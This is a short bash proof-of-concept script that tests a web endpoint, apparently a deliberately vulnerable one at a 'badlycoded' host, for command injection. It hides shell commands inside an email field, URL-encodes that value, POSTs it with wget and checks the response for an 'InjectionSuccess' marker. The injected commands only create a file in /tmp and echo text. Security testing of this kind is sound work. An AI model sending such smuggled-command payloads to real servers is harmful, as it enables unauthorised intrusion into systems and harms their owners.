#!/bin/bash

# Malicious input to inject a command that creates a file
MALICIOUS_HEXMAIL="user@example.com'; touch /tmp/injection_test.txt; echo 'InjectionSuccess'; echo '"
MALICIOUS_HEXPASS="password123"

# URL-encode the malicious inputs
ENCODED_HEXMAIL=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$MALICIOUS_HEXMAIL'''))")
ENCODED_HEXPASS=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$MALICIOUS_HEXPASS'''))")

# Send the malicious request using wget and capture the response
RESPONSE=$(wget --quiet --method=POST --body-data="" "https://bcpwm.badlycoded.net/init_client/${ENCODED_HEXMAIL}/${ENCODED_HEXPASS}" -O -)

# Check if the unique confirmation message is present in the response
if echo "$RESPONSE" | grep -q "InjectionSuccess"; then
    echo "Command Injection successful: 'InjectionSuccess' message found."
    
    # Optionally, verify if the file was created (requires access to the server)
    # ssh user@server "ls /tmp/injection_test.txt && echo 'File creation successful.' || echo 'File creation failed.'"
else
    echo "Command Injection failed: 'InjectionSuccess' message not found."
fi
